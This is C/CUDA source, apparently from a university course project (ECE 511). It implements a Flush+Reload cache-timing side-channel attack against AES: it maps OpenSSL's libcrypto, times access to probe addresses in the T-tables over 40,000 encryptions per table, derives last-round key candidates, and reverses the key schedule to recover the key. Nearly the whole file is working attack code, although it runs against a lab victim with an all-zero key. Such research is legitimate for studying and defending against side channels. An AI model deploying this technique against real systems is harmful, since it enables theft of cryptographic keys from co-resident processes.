#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <stdlib.h>
//#include <openssl/aes.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include "./cacheutils.h"
#include "./aes/aes.h"
#include <map>
#include <vector>

// this number varies on different systems
#define MIN_CACHE_MISS_CYCLES (190)

// more encryptions show features more clearly
#define NUMBER_OF_ENCRYPTIONS (40000)

//#define OUT_WIDTH 4
//#define IN_WIDTH 32

static const uint8_t sbox[256] = {
  //0     1    2      3     4    5     6     7      8    9     A      B    C     D     E     F
  0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,
  0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,
  0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,
  0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75,
  0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84,
  0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf,
  0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8,
  0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2,
  0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,
  0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb,
  0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79,
  0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,
  0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,
  0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,
  0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,
  0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16 };

unsigned char key[] =
{
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

size_t sum;
size_t scount;

char* base;
char* end;

static uint32_t subWord(uint32_t word) {
  uint32_t retval = 0;

  uint8_t t1 = sbox[(word >> 24) & 0x000000ff];
  uint8_t t2 = sbox[(word >> 16) & 0x000000ff];
  uint8_t t3 = sbox[(word >> 8 ) & 0x000000ff];
  uint8_t t4 = sbox[(word      ) & 0x000000ff];

  retval = (t1 << 24) ^ (t2 << 16) ^ (t3 << 8) ^ t4;

  return retval;
}

static int bot_elems(double *arr, int N, int *bot, int n) {
  /*
     insert into bot[0],...,bot[n-1] the indices of n smallest elements 
     of arr[0],...,arr[N-1]
  */
  int bot_count = 0;
  int i;
  for (i=0;i<N;++i) {
    int k;
    for (k=bot_count;k>0 && arr[i]<arr[bot[k-1]];k--);
    if (k>=n) continue; 
    int j=bot_count;
    if (j>n-1) { 
      j=n-1;
    } else { 
      bot_count++;
    }
    for (;j>k;j--) {
      bot[j]=bot[j-1];
    }
    bot[k] = i;
  }
  return bot_count;
}

__global__ void calcCacheMissRate(float **missRate, float **cacheMisses, float **totalEncs) {
  const int IN_WIDTH = 32;
  const int OUT_WIDTH = 4;
  //__shared__ float localMissRate[OUT_WIDTH][IN_WIDTH];
  
  int row = blockIdx.y*OUT_WIDTH + threadIdx.y;
  int col = blockIdx.x*IN_WIDTH + threadIdx.x;
  
  missRate[row][col] = (double) cacheMisses[row][col] / totalEncs[row][col];
}

/*
__global__ void maxCountKeyCandidate(lastRoundKeyGuess, countKeyCandidate) {
  int IN_WIDTH = 32;
  int OUT_WIDTH = 4;
  __shared__ int maxValue;
}
*/

int main(int argc, char **argv) {
//int main() {
// ECE 511 vvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvv
  printf("beginning of main routine\n");
  //int fd = open("/usr/local/lib/libcrypto.so", O_RDONLY);
  int fd = open("/home/databases/gpu_attack/openssl-1.1.0f/libcrypto.so", O_RDONLY);
  size_t size = lseek(fd, 0, SEEK_END);
  if (size == 0)
    exit(-1);
  size_t map_size = size;

  printf("about to check map size\n");
  if (map_size & 0xFFF != 0)
  {
    map_size |= 0xFFF;
    map_size += 1;
  }
  base = (char*) mmap(0, map_size, PROT_READ, MAP_SHARED, fd, 0);
  end = base + size;
 
  printf("declaring all needed variables\n"); 
  unsigned char hostPlainText[] =
  {
    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
  };
  //unsigned char plaintext[16];
  unsigned char hostCipherText[128];
  //unsigned char hostRestoredText[128];
  int hostCountKeyCandidates[16][256];
  int hostCacheMisses[16][256];
  int hostTotalEncs[16][256];
  double hostMissRate[16][256];
  int hostLastRoundKeyGuess[16];
  unsigned int hostKeyStruct[4 * (AES_MAXNR + 1)];
  
  //float *devicePlainText;
  //float *deviceCipherText;
  //float *deviceRestoredText;
  //float *deviceCountKeyCandidates;
  //float *deviceCacheMisses;
  //float *deviceTotalEncs;
  //float *deviceMissRate;
  //float *deviceLastRoundKeyGuess;
  //float *deviceProbe;
  
  //cudaMalloc((void **)&devicePlainText, 16*sizeof(unsigned char));
  //cudaMalloc((void **)&deviceCipherText, 128*sizeof(unsigned char));
  //cudaMalloc((void **)&deviceRestoredText, 128*sizeof(unsigned char));
  //cudaMalloc((void **)&deviceCountKeyCandidates, 16*256*sizeof(int));
  //cudaMalloc((void **)&deviceCacheMisses, 16*256*sizeof(int));
  //cudaMalloc((void **)&deviceTotalEncs, 16*256*sizeof(int));
  //cudaMalloc((void **)&deviceMissRate, 16*256*sizeof(double));
  //cudaMalloc((void **)&deviceLastRoundKeyGuess, 16*sizeof(int));
  //cudaMalloc((void **)&deviceProbe, 4*sizeof(char*));
             
  //cudaMemset(devicePlainText, 0x0, 16*sizeof(unsigned char));
  //cudaMemset(deviceCountKeyCandidates, 0x0, 16*256*sizeof(int));
  //cudaMemset(deviceCacheMisses, 0x0, 16*256*sizeof(int));
  //cudaMemset(deviceTotalEncs, 0x0, 16*256*sizeof(int));
  
  //cudaMemcpy(deviceProbe, hostProbe, 4*sizeof(char*), cudaMemcpyHostToDevice);
 
  printf("memsetting everything to initial 0's\n");

  memset(&hostPlainText, 0x0, 16*sizeof(unsigned char));
  memset(&hostCountKeyCandidates, 0x0, 16*256*sizeof(int));
  memset(&hostCacheMisses, 0x0, 16*256*sizeof(int));
  memset(&hostTotalEncs, 0x0, 16*256*sizeof(int));
  memset(&hostKeyStruct, 0x0, (4 * (AES_MAXNR + 1))*sizeof(unsigned int));

    // YANKED -----------------------------------------------------------------
    /* This should be a hidden type, but EVP requires that the size be known */
/*    struct aes_key_st {
    # ifdef AES_LONG
        unsigned long rd_key[4 * (AES_MAXNR + 1)];
    # else
        unsigned int rd_key[4 * (AES_MAXNR + 1)];
    # endif
        int rounds;
    };
    typedef struct aes_key_st AES_KEY;
*/    // YANKED -----------------------------------------------------------------

  printf("creating key_struct\n");
  //AES_KEY key_struct; // { unsigned int rd_key; int rounds }
  unsigned int rd_key[4 * (AES_MAXNR + 1)];
  unsigned char *devicePlainText;
  unsigned char *deviceCipherText;
  unsigned int *deviceKeyStruct;

  cudaMalloc((void **)&devicePlainText, 4*sizeof(unsigned int));
  cudaMalloc((void **)&deviceCipherText, 4*sizeof(unsigned int));
  cudaMalloc((void **)&deviceKeyStruct, (4 * (AES_MAXNR + 1))*sizeof(unsigned int));

  AES_set_encrypt_key(key, 128, hostKeyStruct); //&key_struct);
  cudaMemcpy(deviceKeyStruct, hostKeyStruct, (4 * (AES_MAXNR + 1))*sizeof(unsigned int), cudaMemcpyHostToDevice);

  uint64_t min_time = rdtsc();
  srand(min_time);
  sum = 0;
  char *hostProbe[] = { 
    //base + 0x1b9280, base + 0x1b9680, base + 0x1b9a80, base + 0x1b9e80
    base + 0x1d5000, base + 0x1d5400, base + 0x1d5800, base + 0x1d5c00
  };
  
  // encryptions for Te0
  for (int i = 0; i < NUMBER_OF_ENCRYPTIONS; ++i)
  {
    for (size_t j = 0; j < 16; ++j) {
      hostPlainText[j] = rand() % 256;
    }
    flush(hostProbe[0]);

    cudaMemcpy(devicePlainText, hostPlainText, 16*sizeof(unsigned char), cudaMemcpyHostToDevice);
    AES_encrypt<<<1,1>>>(devicePlainText, deviceCipherText, deviceKeyStruct);
    cudaMemcpy(hostCipherText, deviceCipherText, 16*sizeof(unsigned char), cudaMemcpyDeviceToHost);

    //AES_encrypt(hostPlainText, hostCipherText, &key_struct);
    size_t time = rdtsc();
    maccess(hostProbe[0]);
    size_t delta = rdtsc() - time;
    hostTotalEncs[2][(int) hostCipherText[2]]++;
    hostTotalEncs[6][(int) hostCipherText[6]]++;
    hostTotalEncs[10][(int) hostCipherText[10]]++;
    hostTotalEncs[14][(int) hostCipherText[14]]++;
    if (delta > MIN_CACHE_MISS_CYCLES) {
      hostCacheMisses[2][(int) hostCipherText[2]]++;
      hostCacheMisses[6][(int) hostCipherText[6]]++;
      hostCacheMisses[10][(int) hostCipherText[10]]++;
      hostCacheMisses[14][(int) hostCipherText[14]]++;
    }
  }

  // encryptions for Te1
  for (int i = 0; i < NUMBER_OF_ENCRYPTIONS; ++i)
  {
    for (size_t j = 0; j < 16; ++j) {
      hostPlainText[j] = rand() % 256;
    }
    flush(hostProbe[1]);
    //AES_encrypt(hostPlainText, hostCipherText, &key_struct);

    cudaMemcpy(devicePlainText, hostPlainText, 16*sizeof(unsigned char), cudaMemcpyHostToDevice);
    AES_encrypt<<<1,1>>>(devicePlainText, deviceCipherText, deviceKeyStruct);
    cudaMemcpy(hostCipherText, deviceCipherText, 16*sizeof(unsigned char), cudaMemcpyDeviceToHost);
    
    size_t time = rdtsc();
    maccess(hostProbe[1]);
    size_t delta = rdtsc() - time;
    hostTotalEncs[3][(int) hostCipherText[3]]++;
    hostTotalEncs[7][(int) hostCipherText[7]]++;
    hostTotalEncs[11][(int) hostCipherText[11]]++;
    hostTotalEncs[15][(int) hostCipherText[15]]++;
    if (delta > MIN_CACHE_MISS_CYCLES) {
      hostCacheMisses[3][(int) hostCipherText[3]]++;
      hostCacheMisses[7][(int) hostCipherText[7]]++;
      hostCacheMisses[11][(int) hostCipherText[11]]++;
      hostCacheMisses[15][(int) hostCipherText[15]]++;
    }
  }

  // encryptions for Te2
  for (int i = 0; i < NUMBER_OF_ENCRYPTIONS; ++i)
  {
    for (size_t j = 0; j < 16; ++j) {
      hostPlainText[j] = rand() % 256;
    }
    flush(hostProbe[2]);
    //AES_encrypt(hostPlainText, hostCipherText, &key_struct);
    
    cudaMemcpy(devicePlainText, hostPlainText, 16*sizeof(unsigned char), cudaMemcpyHostToDevice);
    AES_encrypt<<<1,1>>>(devicePlainText, deviceCipherText, deviceKeyStruct);
    cudaMemcpy(hostCipherText, deviceCipherText, 16*sizeof(unsigned char), cudaMemcpyDeviceToHost);
    
    size_t time = rdtsc();
    maccess(hostProbe[2]);
    size_t delta = rdtsc() - time;
    hostTotalEncs[0][(int) hostCipherText[0]]++;
    hostTotalEncs[4][(int) hostCipherText[4]]++;
    hostTotalEncs[8][(int) hostCipherText[8]]++;
    hostTotalEncs[12][(int) hostCipherText[12]]++;
    if (delta > MIN_CACHE_MISS_CYCLES) {
      hostCacheMisses[0][(int) hostCipherText[0]]++;
      hostCacheMisses[4][(int) hostCipherText[4]]++;
      hostCacheMisses[8][(int) hostCipherText[8]]++;
      hostCacheMisses[12][(int) hostCipherText[12]]++;
    }
  }

  // encryptions for Te3
  for (int i = 0; i < NUMBER_OF_ENCRYPTIONS; ++i)
  {
    for (size_t j = 0; j < 16; ++j) {
      hostPlainText[j] = rand() % 256;
    }
    flush(hostProbe[3]);
    //AES_encrypt(hostPlainText, hostCipherText, &key_struct);
    
    cudaMemcpy(devicePlainText, hostPlainText, 16*sizeof(unsigned char), cudaMemcpyHostToDevice);
    AES_encrypt<<<1,1>>>(devicePlainText, deviceCipherText, deviceKeyStruct);
    cudaMemcpy(hostCipherText, deviceCipherText, 16*sizeof(unsigned char), cudaMemcpyDeviceToHost);
    
    size_t time = rdtsc();
    maccess(hostProbe[3]);
    size_t delta = rdtsc() - time;
    hostTotalEncs[1][(int) hostCipherText[1]]++;
    hostTotalEncs[5][(int) hostCipherText[5]]++;
    hostTotalEncs[9][(int) hostCipherText[9]]++;
    hostTotalEncs[13][(int) hostCipherText[13]]++;
    if (delta > MIN_CACHE_MISS_CYCLES) {
      hostCacheMisses[1][(int) hostCipherText[1]]++;
      hostCacheMisses[5][(int) hostCipherText[5]]++;
      hostCacheMisses[9][(int) hostCipherText[9]]++;
      hostCacheMisses[13][(int) hostCipherText[13]]++;
    }
  }
  
  //cudaMemcpy(deviceCacheMisses, hostCacheMisses, 16*256*sizeof(int), cudaMemcpyHostToDevice);
  //cudaMemcpy(deviceTotalEncs, hostTotalEncs, 16*256*sizeof(int), cudaMemcpyHostToDevice);
  
  //dim3 threadsPerBlock(32, 4); // 128 threads per block
  //dim3 numBlocks(ceil((float)256)/threadsPerBlock.x, ceil((float)16)/threadsPerBlock.y); // 32 blocks
  
  //calcCacheMissRate<<<threadsPerBlock,numBlocks>>>(deviceMissRate, deviceCacheMisses, deviceTotalEncs);
  
  //cudaMemcpy(hostMissRate, deviceMissRate,16*256*sizeof(double), cudaMemcpyDeviceToHost);

  for (int i=0; i<16; i++) {
    for (int j=0; j<256; j++) {
      hostMissRate[i][j] = (double) hostCacheMisses[i][j] / hostTotalEncs[i][j];
    }
  }
  
  int botIndices[16][16];
  for (int i=0; i<16; i++) {
    bot_elems(hostMissRate[i], 256, botIndices[i], 16);
  }
  
  for (int i=0; i<16; i++) {
    // loop through ciphertext bytes with lowest missrates
    for (int j=0; j<16; j++) {
      hostCountKeyCandidates[i][botIndices[i][j] ^ 99]++;
      hostCountKeyCandidates[i][botIndices[i][j] ^ 124]++;
      hostCountKeyCandidates[i][botIndices[i][j] ^ 119]++;
      hostCountKeyCandidates[i][botIndices[i][j] ^ 123]++;
      hostCountKeyCandidates[i][botIndices[i][j] ^ 242]++;
      hostCountKeyCandidates[i][botIndices[i][j] ^ 107]++;
      hostCountKeyCandidates[i][botIndices[i][j] ^ 111]++;
      hostCountKeyCandidates[i][botIndices[i][j] ^ 197]++;
      hostCountKeyCandidates[i][botIndices[i][j] ^ 48]++;
      hostCountKeyCandidates[i][botIndices[i][j] ^ 1]++;
      hostCountKeyCandidates[i][botIndices[i][j] ^ 103]++;
      hostCountKeyCandidates[i][botIndices[i][j] ^ 43]++;
      hostCountKeyCandidates[i][botIndices[i][j] ^ 254]++;
      hostCountKeyCandidates[i][botIndices[i][j] ^ 215]++;
      hostCountKeyCandidates[i][botIndices[i][j] ^ 171]++;
      hostCountKeyCandidates[i][botIndices[i][j] ^ 118]++;
    }
  }
  
/*  
  cudaMemcpy(deviceCountKeyCandidates, hostCountKeyCandidates, 16*256*sizeof(int), cudaMemcpyHostToDevice);
  
  dim3 threadsPerBlock(32, 4); // 128 threads per block
  dim3 numBlocks(ceil((float)256)/threadsPerBlock.x, // 32 blocks
                 ceil((float)16)/threadsPerBlock.y);
  
  maxCountKeyCandidate<<<threadsPerBlock,numBlocks>>>(deviceCountKeyCandidates, deviceLastRoundKeyGuess);

  cudaMemcpy(hostLastRoundKeyGuess, deviceLastRoundKeyGuess, 16*sizeof(int), cudaMemcpyDeviceToHost);
*/

  for (int i=0; i<16; i++) {
    int maxValue = 0;
    int maxIndex;
    for (int j=0; j<256; j++) {
      if (hostCountKeyCandidates[i][j] > maxValue) {
        maxValue = hostCountKeyCandidates[i][j];
        maxIndex = j;
      }
    }
    // save in the guess array
    hostLastRoundKeyGuess[i] = maxIndex;
  }

  uint32_t roundWords[4];
  roundWords[3] = (((uint32_t) hostLastRoundKeyGuess[12]) << 24) ^
                  (((uint32_t) hostLastRoundKeyGuess[13]) << 16) ^
                  (((uint32_t) hostLastRoundKeyGuess[14]) << 8 ) ^
                  (((uint32_t) hostLastRoundKeyGuess[15])      );

  roundWords[2] = (((uint32_t) hostLastRoundKeyGuess[8] ) << 24) ^
                  (((uint32_t) hostLastRoundKeyGuess[9] ) << 16) ^
                  (((uint32_t) hostLastRoundKeyGuess[10]) << 8 ) ^
                  (((uint32_t) hostLastRoundKeyGuess[11])      );

  roundWords[1] = (((uint32_t) hostLastRoundKeyGuess[4] ) << 24) ^
                  (((uint32_t) hostLastRoundKeyGuess[5] ) << 16) ^
                  (((uint32_t) hostLastRoundKeyGuess[6] ) << 8 ) ^
                  (((uint32_t) hostLastRoundKeyGuess[7] )      );

  roundWords[0] = (((uint32_t) hostLastRoundKeyGuess[0] ) << 24) ^
                  (((uint32_t) hostLastRoundKeyGuess[1] ) << 16) ^
                  (((uint32_t) hostLastRoundKeyGuess[2] ) << 8 ) ^
                  (((uint32_t) hostLastRoundKeyGuess[3] )      );

  uint32_t tempWord4, tempWord3, tempWord2, tempWord1;
  uint32_t rcon[10] = {0x36000000, 0x1b000000, 0x80000000, 0x40000000,
                       0x20000000, 0x10000000, 0x08000000, 0x04000000,
                       0x02000000, 0x01000000 };
  // loop to backtrack aes key expansion
  for (int i=0; i<10; i++) {
    tempWord4 = roundWords[3] ^ roundWords[2];
    tempWord3 = roundWords[2] ^ roundWords[1];
    tempWord2 = roundWords[1] ^ roundWords[0];

    uint32_t rotWord = (tempWord4 << 8) ^ (tempWord4 >> 24);

    tempWord1 = (roundWords[0] ^ rcon[i] ^ subWord(rotWord));

    roundWords[3] = tempWord4;
    roundWords[2] = tempWord3;
    roundWords[1] = tempWord2;
    roundWords[0] = tempWord1;
  }

  for(int i=3; i>=0; i--) {
    printf("%x, ", roundWords[i]);
  }

  close(fd);
  munmap(base, map_size);
  fflush(stdout);

  //cudaFree(devicePlainText);
  //cudaFree(deviceCipherText);
  //cudaFree(deviceRestoredText);
  //cudaFree(deviceCountKeyCandidates);
  //cudaFree(deviceCacheMisses);
  //cudaFree(deviceTotalEncs);
  //cudaFree(deviceMissRate);
  //cudaFree(deviceLastRoundKeyGuess);
  //cudaFree(deviceProbe);

  //free(hostPlainText);
  //free(hostCipherText);
  //free(hostRestoredText);
  //free(hostCountKeyCandidates);
  //free(hostCacheMisses);
  //free(hostTotalEncs);
  //free(hostMissRate);
  //free(hostLastRoundKeyGuess);
  //free(hostProbe);
  
// ECE 511 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  
  return 0;
}
